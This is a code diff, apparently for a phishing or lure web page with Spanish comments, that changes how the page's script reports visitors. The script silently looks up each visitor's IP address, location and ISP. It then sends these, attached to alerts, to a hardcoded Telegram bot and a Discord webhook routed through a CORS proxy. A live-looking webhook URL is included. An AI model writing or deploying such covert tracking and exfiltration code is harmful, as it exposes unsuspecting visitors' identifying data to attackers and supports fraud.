@@ -233,7 +233,9 @@
     const chatId = "6375135873";
     const discordWebhookUrl = "https://discord.com/api/webhooks/1570736326683140157/qiUolqkPuTQWUAWcat2JZ_7xkPSDzsYGAlaW4A3UzPI-M9tJyOWj9imU11CgmqxmsO6M";
 
-    // Detectar dispositivo de forma limpia
+    let visitorInfo = "Cargando...";
+
+    // Detectar dispositivo
     function getDeviceType() {
         const ua = navigator.userAgent;
         if (/android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i.test(ua.toLowerCase())) {
@@ -242,37 +244,15 @@
         return "💻 PC / Laptop";
     }
 
-    // Enviar simultáneamente a Telegram y a Discord sin duplicarse
-    function sendAlert(message) {
-        // 1. Enviar a Telegram mediante objeto Image (única petición limpia)
-        const tgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        const img = new Image();
-        img.src = tgUrl;
-
-        // 2. Enviar a Discord usando el proxy CORS para evitar el bloqueo del navegador
-        if (discordWebhookUrl) {
-            const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(discordWebhookUrl);
-            fetch(proxyUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: message })
-            }).catch(err => console.error("Discord error:", err));
-        }
-    }
-
-    // Carga inicial protegida para que la visita se mande estrictamente una sola vez por sesión
+    // Guardamos la IP y dispositivo silenciosamente al cargar (sin mandar alertas falsas de visitas)
     window.addEventListener("DOMContentLoaded", async () => {
-        if (!sessionStorage.getItem("visit_sent")) {
-            sessionStorage.setItem("visit_sent", "true");
-            
-            const device = getDeviceType();
-            try {
-                let res = await fetch("https://ipapi.co/json/");
-                let data = await res.json();
-                sendAlert(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- IP: ${data.ip}\n- Ubicación: ${data.city}, ${data.region}, ${data.country_name}\n- ISP: ${data.org}`);
-            } catch (e) {
-                sendAlert(`🌐 [VISITA NUEVA DETECTADA]\n- Dispositivo: ${device}\n- IP: No disponible automáticamente.`);
-            }
+        const device = getDeviceType();
+        try {
+            let res = await fetch("https://ipapi.co/json/");
+            let data = await res.json();
+            visitorInfo = `Dispositivo: ${device} | IP: ${data.ip} | Ubicación: ${data.city}, ${data.country_name} | ISP: ${data.org}`;
+        } catch (e) {
+            visitorInfo = `Dispositivo: ${device} | IP: No disponible`;
         }
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -281,6 +261,26 @@
             document.getElementById("greeting-title").innerText = `Welcome back, ${userName}!`;
         }
     });
+
+    // Enviar alertas tanto a Telegram como a Discord de forma limpia
+    function sendAlert(message) {
+        const fullMessage = `${message}\n\n📍 [INFO DE CONEXIÓN]\n- ${visitorInfo}`;
+
+        // Telegram
+        const tgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMessage)}`;
+        const img = new Image();
+        img.src = tgUrl;
+
+        // Discord
+        if (discordWebhookUrl) {
+            const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(discordWebhookUrl);
+            fetch(proxyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: fullMessage })
+            }).catch(err => console.error("Discord error:", err));
+        }
+    }
 
     function updateProgress(percent, statusText) {
         document.getElementById("progressBar").style.width = percent + "%";
